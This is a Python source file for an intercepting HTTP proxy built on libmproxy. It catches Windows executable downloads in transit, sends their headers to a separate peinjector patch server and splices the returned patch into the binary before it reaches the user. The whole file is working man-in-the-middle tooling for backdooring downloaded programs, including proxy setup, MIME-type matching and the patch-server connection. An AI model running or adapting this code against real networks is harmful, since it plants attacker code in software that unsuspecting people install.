#!/usr/bin/env python
# -*- encoding: utf-8 -*-

"""
    Interceptor - reference implementation of a Interceptor based on libmproxy with a connection to a peinjector-server
"""

__author__ = 'W.L.'

from threading import Thread
from libmproxy import controller, proxy
from libmproxy.proxy.server import ProxyServer
from libPePatch import PePatch
import sys
import datetime
import netlib
import socket
import time
import ConfigParser

"""
    PE Injector specific part
"""

# Build Payload Modifier
def build_pe_modifier(flow, patch_address, config):
    def modify(chunks):
        
        # Maximum PE Header size to expect
        # Maximum Patch size to expect
        # Connection Timeout
        # Access Token
        max_header, max_patch, connection_timeout, access_token = config
        
        header = True
        patcher = None
        position = 0
        for prefix, content, suffix in chunks:
            # Only do this for 1. chunk, and quick PE check
            if header and (content[:2] == 'MZ'): 
                print("Intercept PE, send header to server (" + str(len(content)) + " bytes)")
                # If something goes wrong while network transmission
                try:
                    # Open socket
                    patch_socket = socket.create_connection(patch_address, connection_timeout)
                    # Send patch to server
                    if (patch_socket is not None) and patch_socket.send(access_token + content[:max_header]):
                        # Receive patch from Server
                        patch_mem = patch_socket.recv(max_patch)
                        # Close socket
                        patch_socket.close()
                        print("Received patch: " + str(len(patch_mem)) + " bytes")
                        patcher = PePatch(patch_mem)
                        if patcher.patch_ok():
                            print("Patch Ok")
                        else:
                            print("Error parsing patch")
                            patcher = None
                except Exception as e:
                    patcher = None

            # Check only 1. chunk for header
            header = False
            
            # Apply Patch
            if patcher is not None:
                content = patcher.apply_patch(content, position)
                position += len(content)

            yield prefix, content, suffix

    return modify

"""
    libmproxy general part
"""
    
 # Bypass stream data without modifying
def bypass_stream(chunks):
    for prefix, content, suffix in chunks:
        yield prefix, content, suffix
        
# Stream Switcher
class StreamLargeBodies(object):
    def __init__(self, max_size):
        self.max_size = max_size

    def run(self, flow, is_request):
        r = flow.request if is_request else flow.response
        code = flow.response.code if flow.response else None
        expected_size = netlib.http.expected_http_body_size(
            r.headers, is_request, flow.request.method, code
        )
        if not (0 <= expected_size <= self.max_size):
            r.stream = r.stream or True
        
# Interception Handler
class InterceptingMaster(controller.Master):

    # PE Mime Types
    binaryMimeTypes = (['application/octet-stream'], ['application/x-msdownload'], ['application/msdos-windows'],
                       ['application/x-winexe'], ['application/x-msdos-program'], ['binary/octet-stream'],
                       ['application/exe'], ['application/x-exe'], ['application/dos-exe'])

    def __init__(self, server, config):
        controller.Master.__init__(self, server)
        # Address of PE Patch Server
        self.pe_server_address = config.get("pe", "pe_server_address")
        # Port to PE Patch Server
        self.pe_server_port = int(config.get("pe", "pe_server_port"))
        # Minimum PE Size
        self.pe_minimum_size = int(config.get("pe", "pe_minimum_size"))
        self.stream_large_bodies = StreamLargeBodies(self.pe_minimum_size)
        # Patch config
        byte_token = bytearray.fromhex(config.get("pe", "pe_server_token"))
        if (len(byte_token) != 32) or (byte_token[:2] != '\xaa\xaa'):
            byte_token = '\xaa\xaa' + 30 * '\x00'
        self.pe_modifier_config = (
            int(config.get("pe_modifier", "max_header")),
            int(config.get("pe_modifier", "max_patch")),
            int(config.get("pe_modifier", "connection_timeout")),
            byte_token
            )                                  
       
    # Run Master
    def runner(self):
        controller.Master.run(self)
        
    # Run Thread
    def run(self):
        t = Thread(target=self.runner)
        t.daemon = True
        t.start()

    # Handles Request (modify websites, ... here)
    def handle_request(self, msg):
        msg.reply()
        return msg

    # Handles Streaming
    def handle_responseheaders(self, msg):
        try:
            if self.stream_large_bodies:
                self.stream_large_bodies.run(msg, False)
                if msg.response.stream:
                    # PE Modifier
                    if msg.response.headers["Content-Type"] in self.binaryMimeTypes:
                        msg.response.stream = build_pe_modifier(msg, (self.pe_server_address, self.pe_server_port), self.pe_modifier_config)
                        
                        # Bypass Stream
                    else:
                        msg.response.stream = bypass_stream

        except netlib.http.HttpError:
            msg.reply(protocol.KILL)
            return

        msg.reply()
        return msg

    # Handles 'normal' response content
    def handle_response(self, msg):
        msg.reply()
        return msg

# Checks config and set default params
def check_config(config):
  if not config.has_section("proxy"):
        config.add_section("proxy")
        
  if not config.has_section("pe"):
      config.add_section("pe")
        
  if not config.has_section("pe_modifier"):
      config.add_section("pe_modifier")
    
  if not config.has_option("proxy", "port"):
      config.set("proxy", "port", "8080")
        
  if not config.has_option("proxy", "cadir"):
      config.set("proxy", "cadir", "./ca")
        
  if not config.has_option("proxy", "mode"):
      config.set("proxy", "mode", "regular")
    
  if not config.has_option("pe", "pe_server_address"):
      config.set("pe", "pe_server_address", "127.0.0.1")
    
  if not config.has_option("pe", "pe_server_port"):
      config.set("pe", "pe_server_port", "31337")
  
  if not config.has_option("pe", "pe_server_token"):
      config.set("pe", "pe_server_token", "aaaa000000000000000000000000000000000000000000000000000000000000")
  
  if not config.has_option("pe", "pe_minimum_size"):
      config.set("pe", "pe_minimum_size", "10240")
        
  if not config.has_option("pe_modifier", "max_header"):
      config.set("pe_modifier", "max_header", "4096")
        
  if not config.has_option("pe_modifier", "max_patch"):
      config.set("pe_modifier", "max_patch", "16384")
        
  if not config.has_option("pe_modifier", "connection_timeout"):
      config.set("pe_modifier", "connection_timeout", "1")

# Main routine
def main(argv):
    # read config from ini file, check it and write it back
    config_file = "config.ini"
    config = ConfigParser.ConfigParser()
    config.read(config_file)
    
    # Check config and set defaault params
    check_config(config)
    
    # write config to file
    with open(config_file, "wb") as cf:    
        config.write(cf)

    # Configure proxy server 
    proxy_config = proxy.ProxyConfig(
        port=int(config.get("proxy", "port")),
        cadir=config.get("proxy", "cadir"),
        mode=config.get("proxy", "mode")
    )
    
    # Create Server
    server = ProxyServer(proxy_config)
    
    # Creater Interceptor
    imaster = InterceptingMaster(server, config)
    imaster.run()
    
    print "Intercepting Proxy listening on " + str(proxy_config.port) + " in " + str(proxy_config.mode) + " mode "
    
    # Wait till keyboard interrupt
    while True:
        try:
            time.sleep(1)    
        except KeyboardInterrupt:
            print 'KeyboardInterrupt received. Shutting down'
            imaster.shutdown()
            sys.exit(0)
        except Exception as e:
            print e
            print 'Exception catched.'
            sys.exit(0)
    
# Call main
if __name__ == '__main__':
    main(sys.argv)